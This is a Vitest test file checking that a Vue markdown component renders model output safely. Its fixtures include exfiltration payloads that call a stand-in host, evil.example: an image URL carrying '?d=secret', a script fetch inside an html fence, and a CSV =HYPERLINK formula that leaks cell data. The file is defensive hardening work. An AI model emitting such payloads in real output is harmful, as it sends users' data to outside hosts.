import { describe, it, expect, vi } from "vitest";
import { mount, flushPromises } from "@vue/test-utils";

// The real renderer, not the stub in markdown-message.test.js: what matters
// is what the library puts in the DOM with MarkdownMessage's options.
vi.mock("vue-stream-markdown/index.css", () => ({}));

import MarkdownMessage from "../components/MarkdownMessage.vue";

async function render(text) {
  const w = mount(MarkdownMessage, { props: { text }, attachTo: document.body });
  // Node renderers are async components: let them load.
  for (let i = 0; i < 20; i++) {
    await flushPromises();
    await new Promise((r) => setTimeout(r, 10));
  }
  return w;
}

describe("MarkdownMessage hardening (M-26)", () => {
  it("fetches no image and runs no html fence for model output", async () => {
    const w = await render(
      "Report ready.\n\n![x](https://evil.example/p.png?d=secret)\n\n" +
        "![y](data:image/png;base64,iVBORw0KGgo=)\n\n" +
        "```html\n<script>fetch('https://evil.example')</script>\n```\n",
    );
    expect(w.text()).toContain("Report ready.");
    expect(w.find("img").exists()).toBe(false);
    expect(w.find("iframe").exists()).toBe(false);
    expect(w.html()).not.toContain("evil.example/p.png");
    w.unmount();
  }, 30_000); // the real renderer loads its node components on first use

  // F73: the library's CSV/TSV table download does no formula neutralisation.
  it("offers no table download for model-written cells", async () => {
    const w = await render('| a | b |\n|---|---|\n| =HYPERLINK("https://evil.example/?"&A2,"x") | 2 |\n');
    expect(w.find("table").exists()).toBe(true);
    expect(w.find('[labelkey="button.copy"]').exists()).toBe(true);
    expect(w.find('[labelkey="button.download"]').exists()).toBe(false);
    w.unmount();
  }, 30_000);
});
